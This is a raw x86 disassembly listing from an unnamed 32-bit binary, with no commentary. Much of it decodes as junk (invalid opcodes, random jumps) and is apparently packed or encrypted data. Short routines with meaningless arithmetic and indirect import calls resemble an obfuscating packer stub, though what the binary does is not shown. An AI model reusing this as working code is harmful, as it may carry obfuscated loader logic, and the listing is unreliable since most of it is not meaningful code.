  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4336d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4337ab
  40736f:	or     DWORD PTR ds:0x4337af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073c7
  407387:	xor    ch,al
  407389:	mov    esi,0x7e7ec20a
  40738e:	add    eax,0xa27e7e7c
  407393:	js     0x4073bf
  407395:	add    ebp,esi
  407397:	mov    edx,0x49fd5ac0
  40739c:	cld    
  40739d:	fcmovu st,st(0)
  40739f:	nop
  4073a0:	push   esp
  4073a1:	push   esi
  4073a2:	push   ss
  4073a3:	xchg   BYTE PTR [ebx],cl
  4073a5:	ret    
  4073a6:	xor    DWORD PTR [ebp-0x2],0x6e9bd811
  4073ad:	shl    DWORD PTR [ebp-0x1cc5fef3],cl
  4073b3:	clc    
  4073b4:	lds    esi,FWORD PTR [ebx]
  4073b6:	inc    ebp
  4073b7:	xchg   ebx,eax
  4073b8:	jo     0x407401
  4073ba:	xchg   ecx,eax
  4073bb:	cli    
  4073bc:	lods   eax,DWORD PTR ds:[esi]
  4073bd:	cmp    DWORD PTR [edi-0x13],ebp
  4073c0:	in     eax,dx
  4073c1:	popa   
  4073c2:	scas   al,BYTE PTR es:[edi]
  4073c3:	or     cl,BYTE PTR ds:0x6fa02a3b
  4073c9:	inc    eax
  4073ca:	xchg   ebx,eax
  4073cb:	xor    edi,DWORD PTR [ebx]
  4073cd:	test   ah,0xec
  4073d0:	sub    al,0x35
  4073d2:	popa   
  4073d3:	cmp    DWORD PTR [edi-0x2b],ebx
  4073d6:	lea    edi,[edi+edi*2-0x79]
  4073da:	nop
  4073db:	mov    ds:0x5ce95a30,al
  4073e0:	dec    edi
  4073e1:	bound  ebp,QWORD PTR [eax]
  4073e3:	push   ss
  4073e4:	pop    ecx
  4073e5:	inc    edx
  4073e6:	xchg   ecx,eax
  4073e7:	pop    eax
  4073e8:	add    DWORD PTR [esi],esi
  4073ea:	fidiv  DWORD PTR [ebp+0x51]
  4073ed:	test   BYTE PTR [eax],bh
  4073ef:	push   ecx
  4073f0:	pusha  
  4073f1:	sbb    BYTE PTR [ebx+0x23444144],dl
  4073f7:	jns    0x40746b
  4073f9:	inc    ebp
  4073fa:	int3   
  4073fb:	sub    cl,BYTE PTR [eax+0x6f9e4fa1]
  407401:	or     ch,BYTE PTR [edi+0x6cd5a12c]
  407407:	or     eax,0xf47efe3c
  40740c:	push   ebx
  40740d:	in     al,dx
  40740e:	jecxz  0x40742a
  407410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407411:	int3   
  407412:	xchg   ecx,eax
  407413:	add    eax,0x3b89220e
  407418:	inc    edx
  407419:	mov    edx,0xff58709
  40741e:	mov    ds:0x79177056,eax
  407423:	or     bh,BYTE PTR [eax]
  407425:	sub    al,0x26
  407427:	into   
  407428:	push   eax
  407429:	nop
  40742a:	lahf   
  40742b:	cmp    al,0x4c
  40742d:	loopne 0x407477
  40742f:	imul   ebx,DWORD PTR [eax+eax*4+0x59],0x40f035c2
  407437:	inc    edx
  407438:	mov    ds:0x87ba78aa,al
  40743d:	pop    eax
  40743e:	add    eax,0x15380da4
  407443:	pop    es
  407444:	cmp    edi,DWORD PTR [edx]
  407446:	cmp    esi,DWORD PTR [esi+0x26946538]
  40744c:	xor    eax,0x65673735
  407451:	push   ds
  407452:	add    ebx,DWORD PTR ds:0x4dd7e937
  407458:	rol    DWORD PTR [esi-0x34eedec4],1
  40745e:	ror    bh,0xab
  407461:	sahf   
  407462:	les    edi,FWORD PTR [edx]
  407464:	imul   edx,eax,0xffffffc2
  407467:	retf   
  407468:	xor    al,0x79
  40746a:	int3   
  40746b:	mov    cs,WORD PTR [bp+si+0xab7]
  407470:	fs sbb eax,0xcf03fd2b
  407476:	shl    ch,cl
  407478:	es iret 
  40747a:	push   0x3e
  40747c:	loope  0x407474
  40747e:	cmp    BYTE PTR [edi-0x47e5c0ce],bl
  407484:	xor    ebp,esi
  407486:	test   BYTE PTR [edi-0xf],cl
  407489:	dec    esp
  40748a:	rol    BYTE PTR [edx],1
  40748c:	jmp    0x4074db
  40748e:	add    bl,dl
  407490:	imul   esp,DWORD PTR ds:0xa93aa915,0xe069ac93
  40749a:	mov    BYTE PTR [esi+0x3ee8c121],al
  4074a0:	mov    edx,0x2dcee5d6
  4074a5:	sbb    al,0xb9
  4074a7:	sar    DWORD PTR [esi+0xd],1
  4074aa:	mov    ecx,0xf321dcdf
  4074af:	aad    0x1c
  4074b1:	imul   esi,ecx,0x23
  4074b4:	es push es
  4074b6:	data16 hlt 
  4074b8:	jge    0x407521
  4074ba:	inc    edi
  4074bb:	shl    DWORD PTR [ecx],cl
  4074bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074be:	mov    bh,0xba
  4074c0:	std    
  4074c1:	add    ebx,0xfde619a6
  4074c7:	add    al,0x41
  4074c9:	jmp    0x5cff:0x8d37fe69
  4074d0:	xlat   BYTE PTR ds:[ebx]
  4074d1:	inc    edi
  4074d2:	cmc    
  4074d3:	or     BYTE PTR [ecx-0x1b0bb29c],bl
  4074d9:	stos   BYTE PTR es:[edi],al
  4074da:	in     al,dx
  4074db:	xchg   edi,eax
  4074dc:	sub    BYTE PTR [ecx+0x2e],bl
  4074df:	cmc    
  4074e0:	neg    BYTE PTR [eax]
  4074e2:	mov    dh,BYTE PTR [esi+0x55]
  4074e5:	xor    eax,0x73ad814c
  4074ea:	add    DWORD PTR [ebp+0xbca448a],esi
  4074f0:	mov    bl,0x0
  4074f2:	add    al,0xd9
  4074f4:	shr    DWORD PTR [eax-0x47],0x62
  4074f8:	xor    DWORD PTR ds:0x7a823705,0x3a
  4074ff:	inc    eax
  407500:	xchg   esp,eax
  407501:	cli    
  407502:	inc    ecx
  407503:	retf   
  407504:	cmc    
  407505:	ja     0x4074e6
  407507:	into   
  407508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407509:	shr    DWORD PTR [ebx+eax*8+0x24af2b64],1
  407510:	in     eax,0x81
  407512:	imul   edi,esi,0x30f04825
  407518:	sub    bh,al
  40751a:	xchg   ebx,eax
  40751b:	rcr    BYTE PTR [ebp+0x30a17bb5],1
  407521:	sub    DWORD PTR [edi],0xfffffffd
  407524:	jnp    0x40754f
  407526:	fdiv   QWORD PTR [ebp+0x52]
  407529:	mov    bh,0x8b
  40752b:	or     BYTE PTR [edx],al
  40752d:	and    eax,0x1bb3ea84
  407532:	bound  esp,QWORD PTR [eax]
  407534:	in     al,0xd6
  407536:	add    al,0xbd
  407538:	repz mov eax,ds:0xa29ce062
  40753e:	jb     0x4074d9
  407540:	mov    ?,edx
  407542:	int3   
  407543:	pop    esp
  407544:	test   al,0x77
  407546:	inc    esi
  407547:	fisttp WORD PTR [ebx+0x79]
  40754a:	aaa    
  40754b:	ret    
  40754c:	sar    BYTE PTR [edx-0x73],0x52
  407550:	js     0x4074e1
  407552:	jno    0x40753f
  407554:	sub    ch,ah
  407556:	retf   0xe2ee
  407559:	mov    esi,DWORD PTR [esi+0x5d]
  40755c:	fdivr  QWORD PTR [esi+0x4]
  40755f:	xor    eax,0x4e7bfebc
  407564:	jle    0x40756e
  407566:	jecxz  0x407580
  407568:	les    ebx,FWORD PTR [eax+0x71a22b9]
  40756e:	add    al,0xec
  407570:	shr    DWORD PTR [edi],1
  407572:	pop    edx
  407573:	jb     0x4075b5
  407575:	call   FWORD PTR [ebx]
  407577:	sbb    DWORD PTR [ecx+esi*4+0xeb3ea63],ebx
  40757e:	cmp    al,0xc5
  407580:	rcl    DWORD PTR [ebp+0x32],1
  407583:	dec    DWORD PTR [edi]
  407585:	sbb    edi,eax
  407587:	nop
  407588:	shr    DWORD PTR [bp+di-0x45],cl
  40758c:	adc    al,0x98
  40758e:	cs dec esi
  407590:	sub    ah,BYTE PTR [ebx]
  407592:	push   edx
  407593:	mov    esp,0xc600e764
  407598:	cwde   
  407599:	pushf  
  40759a:	sbb    DWORD PTR [eax-0x13ba3852],edi
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4336d3
  4075b4:	sub    DWORD PTR ds:0x43368f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43367f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4336eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43368f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43368f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43368f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43368f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43368f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	out    dx,eax
  407656:	pop    ecx
  407657:	add    DWORD PTR [ecx],0x7e7ec011
  40765d:	add    eax,0x127e7e7c
  407662:	sub    al,BYTE PTR [eax]
  407664:	mov    BYTE PTR [ebx],ch
  407666:	loope  0x407635
  407668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407669:	dec    ecx
  40766a:	mov    ds:0x6d47f449,eax
  40766f:	cmp    cl,cl
  407671:	add    al,BYTE PTR [ebx]
  407673:	or     dh,BYTE PTR [edi+0x11ba8e20]
  407679:	cmc    
  40767a:	lods   al,BYTE PTR ds:[esi]
  40767b:	mov    edi,0x73559196
  407680:	fldcw  WORD PTR [ebp+ebp*4-0x78097d52]
  407687:	dec    ecx
  407688:	ds test al,0x9a
  40768b:	and    BYTE PTR [ecx-0x57935d20],ch
  407691:	fisubr DWORD PTR [edi-0x475a0fb]
  407697:	sub    DWORD PTR [edx+edx*2],eax
  40769a:	js     0x407662
  40769c:	cmovg  esi,DWORD PTR [eax+0x5c8df3e4]
  4076a3:	adc    esp,DWORD PTR [eax]
  4076a5:	push   esp
  4076a6:	push   0x4749d4a0
  4076ab:	popa   
  4076ac:	js     0x407663
  4076ae:	mov    DWORD PTR [esi],0x49a690a2
  4076b4:	jb     0x4076e8
  4076b6:	mov    al,ds:0x1c531f95
  4076bb:	xchg   esi,eax
  4076bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076bd:	cmp    edi,DWORD PTR [esi-0x44]
  4076c0:	outs   dx,BYTE PTR ds:[esi]
  4076c1:	ins    DWORD PTR es:[edi],dx
  4076c2:	or     bl,BYTE PTR [edx-0x23fbcf83]
  4076c8:	cs mov ch,0xb
  4076cb:	add    eax,0xbc215ef7
  4076d0:	cld    
  4076d1:	cwde   
  4076d2:	mov    esi,esi
  4076d4:	mov    eax,ds:0x48b52e12
  4076d9:	ins    BYTE PTR es:[edi],dx
  4076da:	cmp    ah,BYTE PTR [ebp-0x4609a670]
  4076e0:	jbe    0x40772a
  4076e2:	test   DWORD PTR [ecx+0x1dbdd8ee],ecx
  4076e8:	pop    ds
  4076e9:	jbe    0x407703
  4076eb:	adc    ebp,esp
  4076ed:	sbb    DWORD PTR [edx+ebp*1],edx
  4076f0:	out    dx,al
  4076f1:	mov    al,0x10
  4076f3:	fadd   st(7),st
  4076f5:	add    BYTE PTR [ebx],ah
  4076f7:	sar    BYTE PTR [ecx-0x5a],cl
  4076fa:	hlt    
  4076fb:	jno    0x4076dd
  4076fd:	pop    ebx
  4076fe:	and    BYTE PTR [edi+0x4392dcd6],dh
  407704:	xchg   esi,eax
  407705:	into   
  407706:	out    0x74,eax
  407708:	push   edi
  407709:	sub    BYTE PTR [edi-0x6d4514d6],0x6e
  407710:	and    al,0xa5
  407712:	push   cs
  407713:	aas    
  407714:	xchg   ebp,eax
  407715:	sahf   
  407716:	leave  
  407717:	outs   dx,DWORD PTR ds:[esi]
  407718:	xchg   BYTE PTR [edx-0x1c401375],bh
  40771e:	(bad)  
  40771f:	and    eax,DWORD PTR [eax-0x5a]
  407722:	mov    ecx,0xc0f6b9b8
  407727:	pop    esp
  407728:	aam    0x9e
  40772a:	and    bl,0x86
  40772d:	retf   0xc179
  407730:	sbb    DWORD PTR [ecx+0x41719eab],ebp
  407736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407737:	pop    ss
  407738:	rol    DWORD PTR [edx+0x11],cl
  40773b:	add    dh,BYTE PTR [edx]
  40773d:	and    esp,esp
  40773f:	fs popa 
  407741:	ret    
  407742:	es or  eax,0x3be2b5cc
  407748:	xchg   edx,eax
  407749:	std    
  40774a:	xor    al,0x80
  40774c:	sbb    DWORD PTR [esi],edi
  40774e:	push   ss
  40774f:	call   0xfce5dbac
  407754:	fist   WORD PTR [eax]
  407756:	fst    st(2)
  407758:	cmp    esi,DWORD PTR [edi-0x1e8d319c]
  40775e:	stos   BYTE PTR es:[edi],al
  40775f:	lock fmul DWORD PTR ds:0x700c8ed8
  407766:	stc    
  407767:	mov    ebp,0xeba61625
  40776c:	bound  ebp,QWORD PTR [ecx-0x7e]
  40776f:	adc    DWORD PTR [edi+0x37],edi
  407772:	xor    dh,BYTE PTR cs:[ebx]
  407775:	dec    edi
  407776:	(bad)  
  407778:	(bad)  
  407779:	imul   edi,DWORD PTR [ebx+0x14ece635],0xffffff8c
  407780:	addr16 jbe 0x4077c7
  407783:	inc    eax
  407784:	xchg   ecx,eax
  407785:	je     0x407798
  407787:	dec    ebp
  407788:	scas   eax,DWORD PTR es:[edi]
  407789:	adc    eax,0xd2d5f62e
  40778e:	stc    
  40778f:	ror    BYTE PTR [eax-0x7dab92c4],1
  407795:	jge    0x4077e5
  407797:	xchg   ebx,eax
  407798:	loopne 0x4077f8
  40779a:	xchg   edi,eax
  40779b:	mov    cl,BYTE PTR [ebx]
  40779d:	sub    al,BYTE PTR [eax+0x54]
  4077a0:	nop
  4077a1:	mov    ds:0xf07486b2,al
  4077a6:	pop    ebx
  4077a7:	jecxz  0x4077d3
  4077a9:	pop    eax
  4077aa:	rcl    BYTE PTR [edx+0x59],1
  4077ad:	push   ecx
  4077ae:	mov    eax,ds:0x74e53bed
  4077b3:	nop
  4077b4:	pushf  
  4077b5:	mov    dh,BYTE PTR [ebx]
  4077b7:	adc    al,0x5d
  4077b9:	xor    eax,0x5695ff36
  4077be:	add    BYTE PTR [ebx],dh
  4077c0:	mov    BYTE PTR [edx+0x5933c010],bl
  4077c6:	jno    0x407831
  4077c8:	mov    edi,0xac9b80b5
  4077cd:	xchg   ecx,eax
  4077ce:	loopne 0x40776b
  4077d0:	popf   
  4077d1:	jo     0x407806
  4077d3:	into   
  4077d4:	push   ss
  4077d5:	jne    0x407784
  4077d7:	jp     0x4077ef
  4077d9:	and    ecx,DWORD PTR [ecx+edx*8]
  4077dc:	ins    BYTE PTR es:[edi],dx
  4077dd:	pop    ebx
  4077de:	out    dx,eax
  4077df:	lods   eax,DWORD PTR ds:[esi]
  4077e0:	xlat   BYTE PTR ds:[ebx]
  4077e1:	sbb    BYTE PTR [esi],dh
  4077e3:	jl     0x407862
  4077e5:	mov    bh,0x85
  4077e7:	punpcklbw mm6,DWORD PTR [esp+0x3a]
  4077ec:	sbb    DWORD PTR [ebp+0x63df0798],ecx
  4077f2:	mov    DWORD PTR ds:0x629b3450,edx
  4077f8:	sar    DWORD PTR [ebx-0x41a5b427],0xae
  4077ff:	out    dx,eax
  407800:	dec    esp
  407801:	std    
  407802:	mov    WORD PTR [edi],gs
  407804:	dec    edi
  407805:	mov    cl,0xd8
  407807:	fs xchg ecx,eax
  407809:	mov    eax,ds:0x27f089b1
  40780e:	pop    edx
  40780f:	mov    bl,0xbc
  407811:	or     ecx,DWORD PTR [edx+0x51]
  407814:	(bad)  
  407815:	cmc    
  407816:	imul   DWORD PTR [edx+0x38]
  407819:	data16 or bl,0x9
  40781d:	push   es
  40781e:	cmc    
  40781f:	pop    esi
  407820:	jno    0x4077fd
  407822:	cdq    
  407823:	in     eax,dx
  407824:	retf   
  407825:	ins    DWORD PTR es:[edi],dx
  407826:	icebp  
  407827:	icebp  
  407828:	ss mov ch,0x11
  40782b:	(bad)  
  40782c:	jmp    0xbadb3955
  407831:	aam    0x46
  407833:	inc    esp
  407834:	cmp    ebp,edi
  407836:	mov    bh,0x79
  407838:	or     BYTE PTR [eax-0x361392ff],dl
  40783e:	sbb    al,0x80
  407840:	push   ecx
  407841:	cmp    edx,DWORD PTR [eax+0x8a044e2]
  407847:	mov    ebp,0x99643fd3
  40784c:	icebp  
  40784d:	(bad)  
  40784f:	loopne 0x4077db
  407851:	adc    BYTE PTR [ebp-0x1d],ch
  407854:	pop    esi
  407855:	int3   
  407856:	mov    eax,0x29645f9c
  40785b:	ins    DWORD PTR es:[edi],dx
  40785c:	dec    edx
  40785d:	repz (bad) 
  40785f:	jbe    0x4077e7
  407861:	xchg   ebp,eax
  407862:	in     al,0x67
  407864:	repnz test DWORD PTR [edx+edx*4+0x4ab1b499],0x57ce2b56
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43367f,0x4336e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43379b,0x12
  40788b:	cmp    DWORD PTR ds:0x43379b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43379b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43379b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43379b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43371f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43371f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43371f,esi
  4078e0:	cmp    DWORD PTR ds:0x43371f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43371f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xe8,eax
  407922:	fimul  WORD PTR [ebp-0x28]
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xb97e7e7c
  40792e:	mov    esp,0x9e9b8ec2
  407933:	xor    bl,0x6b
  407936:	in     al,dx
  407937:	cld    
  407938:	mov    ds:0x348edc12,al
  40793d:	and    DWORD PTR [ecx+0x14c11491],ebp
  407943:	fisttp WORD PTR [ebx+0x49]
  407946:	mov    edx,0xa17aa54e
  40794b:	xor    DWORD PTR ds:0xbde7818f,ecx
  407951:	cs shl dh,1
  407954:	pop    eax
  407955:	aad    0x73
  407957:	scas   eax,DWORD PTR es:[edi]
  407958:	xchg   edi,eax
  407959:	jge    0x407915
  40795b:	jp     0x407930
  40795d:	imul   BYTE PTR [ecx+0x6b]
  407960:	mov    ebp,DWORD PTR [edx+0x4e38686d]
  407966:	js     0x407950
  407968:	faddp  st(3),st
  40796a:	lods   al,BYTE PTR ds:[esi]
  40796b:	es jecxz 0x40794d
  40796e:	push   ebp
  40796f:	sbb    eax,DWORD PTR [eax-0x17]
  407972:	les    ebx,FWORD PTR [edx-0x16]
  407975:	(bad)  
  407976:	and    edx,esp
  407978:	inc    eax
  407979:	and    ecx,esp
  40797b:	arpl   WORD PTR [ebp+0x7f5f8957],ax
  407981:	jbe    0x4079f2
  407983:	in     eax,0x6a
  407985:	sbb    BYTE PTR [edi-0x65987275],cl
  40798b:	ret    
  40798c:	imul   ecx,ecx,0xffffffd2
  40798f:	sub    al,0xf9
  407991:	das    
  407992:	add    eax,0xe3dd66ff
  407997:	push   eax
  407998:	iret   
  407999:	jecxz  0x407a13
  40799b:	test   eax,0x9ce20ea5
  4079a0:	cwde   
  4079a1:	jo     0x407964
  4079a3:	cli    
  4079a4:	xchg   edx,eax
  4079a5:	xlat   BYTE PTR ds:[ebx]
  4079a6:	mov    ch,0xa0
  4079a8:	push   eax
  4079a9:	or     eax,0x390e086e
  4079ae:	mul    BYTE PTR [edx+0x2a]
  4079b1:	mov    dl,0x8e
  4079b3:	cwde   
  4079b4:	adc    al,0xd2
  4079b6:	(bad)  
  4079b7:	out    dx,al
  4079b8:	into   
  4079b9:	sub    edi,DWORD PTR [edx+0x2f]
  4079bc:	pop    eax
  4079bd:	loop   0x4079ed
  4079bf:	sbb    eax,0x526ee4a2
  4079c4:	mov    dh,0x46
  4079c6:	pop    es
  4079c7:	sub    esi,DWORD PTR [ecx-0x4efa7066]
  4079cd:	xchg   esi,eax
  4079ce:	adc    ebx,ecx
  4079d0:	cmp    DWORD PTR [edx+0x79],ecx
  4079d3:	test   BYTE PTR [esi],ch
  4079d5:	mov    eax,0x614ddd84
  4079da:	adc    eax,0xacd154da
  4079df:	mov    ebx,0xf2900cb5
  4079e4:	xchg   ecx,eax
  4079e5:	(bad)  
  4079e6:	in     eax,dx
  4079e7:	scas   eax,DWORD PTR es:[edi]
  4079e8:	call   0xffed:0x635afded
  4079ef:	mov    cl,0x67
  4079f1:	xor    cl,ah
  4079f3:	push   edx
  4079f4:	xor    eax,0x43ab0d2e
  4079f9:	js     0x407a7a
  4079fb:	mov    esi,0xc9a06367
  407a00:	test   eax,0xa854a974
  407a05:	adc    ecx,DWORD PTR [edi]
  407a07:	xchg   DWORD PTR [edi],ecx
  407a09:	mov    eax,ds:0x697bb9ae
  407a0e:	fild   DWORD PTR [ebx-0x3]
  407a11:	or     BYTE PTR [edx+edx*4-0x702587d3],cl
  407a18:	adc    DWORD PTR [eax-0x1a3fae20],ecx
  407a1e:	(bad)  
  407a1f:	pushf  
  407a20:	inc    ebx
  407a21:	xor    ebx,DWORD PTR [edi]
  407a23:	rol    DWORD PTR [esi-0x656b26b4],0x35
  407a2a:	daa    
  407a2b:	neg    BYTE PTR [ecx+0x72]
  407a2e:	inc    edx
  407a2f:	add    BYTE PTR [esi+0x4b16560a],al
  407a35:	bound  ecx,QWORD PTR [ecx+ebp*4]
  407a38:	add    ch,bh
  407a3a:	cmp    BYTE PTR [eax],0x86
  407a3d:	mov    eax,0xe112dcf3
  407a42:	(bad)  
  407a43:	mov    bl,0xd1
  407a45:	mov    eax,ds:0x1707e4f
  407a4a:	jecxz  0x407a04
  407a4c:	shl    bh,cl
  407a4e:	xlat   BYTE PTR ds:[ebx]
  407a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a50:	lea    edi,[ebx]
  407a52:	cdq    
  407a53:	xchg   edi,eax
  407a54:	clc    
  407a55:	and    DWORD PTR [eax-0x4eb7b278],ecx
  407a5b:	sbb    eax,0x6b3a23dc
  407a60:	jl     0x407a50
  407a62:	mov    al,ds:0x750e65bf
  407a67:	pop    eax
  407a68:	dec    eax
  407a69:	ds add eax,0x4f8274d1
  407a6f:	ja     0x407ae5
  407a71:	pop    ss
  407a72:	mov    cl,0xdf
  407a74:	mov    ecx,0xab82e280
  407a79:	cld    
  407a7a:	mov    esi,0x7b39bcda
  407a7f:	mov    DWORD PTR ds:0x190794c8,0x2943b5c1
  407a89:	nop
  407a8a:	sbb    al,0xf1
  407a8c:	mov    ds:0x3e562ede,al
  407a91:	push   ss
  407a92:	cmp    DWORD PTR [edi-0x4a131427],0x7104619c
  407a9c:	std    
  407a9d:	aad    0xe8
  407a9f:	icebp  
  407aa0:	(bad)  
  407aa2:	mov    ebx,0xcff409ec
  407aa7:	xchg   edi,eax
  407aa8:	addr16 fwait
  407aaa:	imul   edx,DWORD PTR [edi+0x60],0x7f206331
  407ab1:	enter  0xcd22,0x91
  407ab5:	out    dx,al
  407ab6:	ss dec esi
  407ab8:	lds    ecx,FWORD PTR [esi+0x2b]
  407abb:	scas   eax,DWORD PTR es:[edi]
  407abc:	(bad)  
  407abd:	push   ebx
  407abe:	bound  ebx,QWORD PTR [ecx-0x37]
  407ac1:	fisttp WORD PTR [ebx-0xd82004d]
  407ac7:	or     eax,0xed3f6486
  407acc:	fsubr  DWORD PTR [edx]
  407ace:	imul   edx,DWORD PTR [ebx],0x63
  407ad1:	outs   dx,BYTE PTR ds:[esi]
  407ad2:	sbb    ch,BYTE PTR [esi]
  407ad4:	inc    ebx
  407ad5:	fidiv  DWORD PTR [ebp-0x3d]
  407ad8:	stos   BYTE PTR es:[edi],al
  407ad9:	cmp    BYTE PTR [eax-0x80e56ff],dh
  407adf:	es xchg ecx,eax
  407ae1:	lock lock mov DWORD PTR [esi+0x5f],edx
  407ae6:	lock sub eax,0xb1aab1ef
  407aec:	ja     0x407ace
  407aee:	shr    BYTE PTR [bp+0x1d3d],0x8
  407af4:	pop    ds
  407af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407af6:	add    DWORD PTR [edi+0x464aa850],ebp
  407afc:	popa   
  407afd:	aam    0xd0
  407aff:	call   0x331b159d
  407b04:	cmp    edx,ecx
  407b06:	add    al,0x1c
  407b08:	mov    eax,gs:0xa9e3324f
  407b0e:	pop    edx
  407b0f:	ror    BYTE PTR [edx-0x76],1
  407b12:	add    al,0x69
  407b14:	sbb    DWORD PTR [eax],edx
  407b16:	xchg   esi,eax
  407b17:	mov    esp,0xc6230c85
  407b1c:	es xchg ebp,eax
  407b1e:	cmc    
  407b1f:	std    
  407b20:	push   edi
  407b21:	mov    dh,0x74
  407b23:	in     al,dx
  407b24:	aaa    
  407b25:	mov    ebx,0x1ff0fdff
  407b2a:	inc    ebp
  407b2b:	hlt    
  407b2c:	dec    edx
  407b2d:	inc    eax
  407b2e:	std    
  407b2f:	int3   
  407b30:	pop    edi
  407b31:	sbb    edi,DWORD PTR [ecx]
  407b33:	pop    ds
  407b34:	cmp    ebx,esi
  407b36:	jle    0x407b5f
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x43372b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4336d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433687,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4337af,0x43368f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43371f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433683
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433727,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43369f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4336eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4336eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433757
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4336d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4336d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4336d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4336d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4336d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4336d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4336d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4336d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
